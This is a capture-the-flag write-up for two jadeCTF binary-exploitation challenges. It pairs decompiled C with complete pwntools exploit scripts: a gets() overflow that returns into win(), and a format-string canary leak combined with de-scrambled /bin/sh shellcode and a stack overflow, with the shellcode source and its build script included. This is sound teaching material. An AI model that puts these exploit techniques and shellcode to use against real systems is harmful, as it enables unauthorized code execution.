# BABY PWN
We are given a binary.  
First, run checksec on it:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

On analyzing it with Ghidra, we find the `start_program()` function:
```c
void start_program(void)

{
  char local_208 [512];
  
  puts("Enter your name:");
  gets(local_208);
  printf("Hello %s, welcome to jadeCTF!\n",local_208);
  return;
}
```
This is a simple Buffer Overflow. There is also a `win()` function which we need to call:
```c
void win(void)

{
  char local_78 [104];
  FILE *local_10;
  
  puts("Nice job :)");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Sorry, flag doesn\'t exist.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_78,100,local_10);
  printf("Here is your flag: %s\n",local_78);
  return;
}
```
We can overflow the `local_208` variable and call the `win()` function to get the flag. The solve script:
```py
from pwn import *

BINARY = "chall"

context.binary = BINARY
elf = context.binary

# p = elf.process()
p = remote("34.76.206.46", 10002)

OFFSET = 0x200 + 8

payload = cyclic(OFFSET)
payload += p64(elf.symbols["win"])

p.sendlineafter(b"Enter your name:\n", payload)
p.interactive()
```
FLAG: `jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}`

# DATA STORAGE
First run checksec on the binary:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```

Analyzing the binary in Ghidra. This is the main function:
```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  puts("This is a data storing system.");
  puts("It stores your name, address and other details");
  gen_ints();
  database_store();
  puts("Thank you for using our storage facility!");
  return 0;
}
```
We can see that it first calls the `gen_ints()` function. Let's see that:
```c
void gen_ints(void)

{
  int iVar1;
  time_t tVar2;
  time_t local_10;
  
  tVar2 = time(&local_10);
  srand((uint)tVar2);
  iVar1 = rand();
  n = iVar1 % 0x32 + 1;
  iVar1 = rand();
  an = iVar1 % 0x19 + 1;
  iVar1 = rand();
  b = iVar1 % 0x32 + 1;
  iVar1 = rand();
  u = iVar1 % 0x32 + 1;
  a = 0x200 - (u + n + an + b);
  return;
}
```
It basically generates 4 random numbers, stores them in `n`, `an`, `b` and `u`. Then subtracts the sum of these from 0x200 and stores it in `a`.
Next, we have the `database_store()` function:
```c
void database_store(void)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  size_t sVar4;
  long in_FS_OFFSET;
  char local_238 [16];
  char local_228 [16];
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Are you sure that you want to store data [yes/no]?");
  fgets(local_238,10,stdin);
  sVar4 = strcspn(local_238,"\r\n");
  local_238[sVar4] = '\0';
  printf("You entered: ");
  printf(local_238);
  puts("\nIs that correct?");
  fgets(local_228,10,stdin);
  sVar4 = strcspn(local_228,"\r\n");
  local_228[sVar4] = '\0';
  iVar1 = strcmp(local_228,"yes");
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Now, it\'s time to enter your details");
  puts(
      "Note that there is a length given for each field, you have to enter atleast that many charact ers"
      );
  puts("Fill it up with spaces if your input is less");
  printf("Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (i n this order):\n"
         ,(ulong)n,(ulong)an,(ulong)b,(ulong)u,(ulong)a);
  gets(local_218);
  puts("Scrambling your data so that hackers can\'t steal it...");
  modify(name,local_218,0);
  uVar2 = n;
  modify(admno,local_218,n);
  iVar1 = uVar2 + an;
  modify(branch,local_218,iVar1);
  iVar1 = iVar1 + b;
  modify(university,local_218,iVar1);
  modify(address,local_218,iVar1 + u);
  memset(local_218,0,0x200);
  modify(local_218,name,0);
  iVar1 = (int)n / 2;
  modify(local_218 + iVar1,branch,0);
  iVar1 = iVar1 + (int)b / 3;
  modify(local_218 + iVar1,admno,0);
  iVar1 = iVar1 + (int)an / 3;
  modify(local_218 + iVar1,university,0);
  iVar1 = iVar1 + (int)u / 2;
  modify(local_218 + iVar1,address,0);
  iVar1 = iVar1 + (int)a / 10;
  modify(local_218 + iVar1,branch,(int)b / 3);
  iVar1 = iVar1 + (b - (int)b / 3);
  modify(local_218 + iVar1,name,(int)n / 2);
  iVar1 = iVar1 + (n - (int)n / 2);
  modify(local_218 + iVar1,address,(int)a / 10);
  iVar1 = iVar1 + (int)a / 10;
  modify(local_218 + iVar1,university,(int)u / 2);
  uVar2 = u;
  if ((int)u < 0) {
    uVar2 = u + 3;
  }
  iVar1 = iVar1 + ((int)uVar2 >> 2);
  modify(local_218 + iVar1,admno,(int)an / 3);
  iVar1 = iVar1 + (an - (int)an / 3);
  modify(local_218 + iVar1,address,(int)a / 10 + (int)a / 10);
  uVar2 = u;
  if ((int)u < 0) {
    uVar2 = u + 3;
  }
  uVar3 = u;
  if ((int)u < 0) {
    uVar3 = u + 3;
  }
  modify(local_218 + (int)(iVar1 + a + (-((int)a / 10) - (int)a / 10)),university,
         ((int)uVar3 >> 2) + (int)u / 2,u - (((int)uVar2 >> 2) + (int)u / 2));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
This is a big code. First it is taking some inputs, and then we can see that we have a format strings vulnerability in a printf statement. Moving on, it takes an input (we have buffer overflow here as gets is being used). Then it calls the `modify()` function on our input.
```c
undefined * modify(undefined *param_1,long param_2,int param_3,int param_4)

{
  int local_20;
  long local_18;
  undefined *local_10;
  
  local_18 = param_2;
  local_10 = param_1;
  for (local_20 = param_4; 0 < local_20; local_20 = local_20 + -1) {
    *local_10 = *(undefined *)(local_18 + param_3);
    local_10 = local_10 + 1;
    local_18 = local_18 + 1;
  }
  *local_10 = 0;
  return local_10;
}
```
On seeing this function carefully we find that this is basically slicing the string (i.e., finding a substring). So, with that in mind, let's continue our analysis.  
The code performs some substring operations and then stores each part in different variables, and then slices these variables at some positions and stores it back in our original buffer.
So, our exploit would be like this:
1. First, leak the address of the buffer and the canary using the format strings.
2. Craft a shellcode which runs /bin/sh.
3. Enter the shellcode in the buffer, and then overflow it. Enter the canary at the appropriate place, then ret to our shellcode.
4. Reverse the scrambling part and "de-scramble" this payload, so that when the binary scrambles it, it becomes the original payload.  
Exploit Script:
```py
from pwn import *
import re
from time import sleep
import subprocess as sb

BINARY = "chall"
context.binary = BINARY
ELF = context.binary

# p = ELF.process()
p = remote("34.76.206.46", 10003)

def scramble(x):
    ptr = 0
    name = x[ptr:ptr+n]
    ptr += n
    admno = x[ptr:ptr+an]
    ptr += an
    branch = x[ptr:ptr+b]
    ptr += b
    university = x[ptr:ptr+u]
    ptr += u
    address = x[ptr:ptr+a]
    ptr += a
    
    new_x = name[:n//2] + branch[:b//3] + admno[:an//3] + university[:u//2] + address[:a//10] + branch[b//3:] + name[n//2:] + address[a//10:a//10 + a//10] + university[u//2:u//2+u//4] + admno[an//3:] + address[a//10+a//10:] + university[u//2+u//4:] + x[ptr:]
    return new_x

def fix_payload(n, an, b, u, a, payload):
    s = n+an+b+u+a
    x = []
    for i in range(s):
        x.append(i)
    x = scramble(x)
    new_payload = [0]*len(payload)
    for i in range(len(x)):
        new_payload[x[i]] = payload[i]
    new_payload[s:] = payload[s:]
    return new_payload

payload = b"%7$p%77$p"
p.recvuntil(b"[yes/no]?\n")
p.send(payload)

recvd = p.recvline().strip().decode()
BUFFER = int("0x" + recvd.split("0x")[1], 16)
CANARY = int("0x" + recvd.split("0x")[-1], 16)

log.info(f"canary -> {hex(CANARY)}")
log.info(f"buffer -> {hex(BUFFER)}")

p.sendlineafter(b"correct?\n", b"yes")
p.recvuntil(b"input is less\n")
n, an, b, u, a = [int(x) for x in re.findall("\d+", p.recvline().decode())]
s = n+an+b+u+a

sb.run("./shellcode_compile.sh shellcode.s", shell=True)
shellcode = open("shellcode.bin","rb").read().strip()
sb.run("rm -rf ./shellcode.bin", shell=True)
# shellcode = asm(shellcraft.execve(path="/bin/sh"))
payload = b"\x90"*50 + shellcode
payload += b"\x00"*(520-len(payload))
payload += p64(CANARY)
payload += b"a"*8
payload += p64(BUFFER)

payload = fix_payload(n, an, b, u, a, payload)
payload = bytearray(payload)
p.sendline(payload)

p.interactive()
```
**shellcode.s**
```s
.global _start
_start:
.intel_syntax noprefix
    xor rdx, rdx
    xor rsi, rsi
    lea rdi, [rip+binsh]
    mov rax, 59
    syscall
    binsh:
        .string "/bin/sh"
```
**shellcode_compile.sh**
```bash
#!/bin/bash
gcc -nostdlib -static "$1" -o shellcode
objcopy --dump-section .text=shellcode.bin shellcode
rm shellcode
```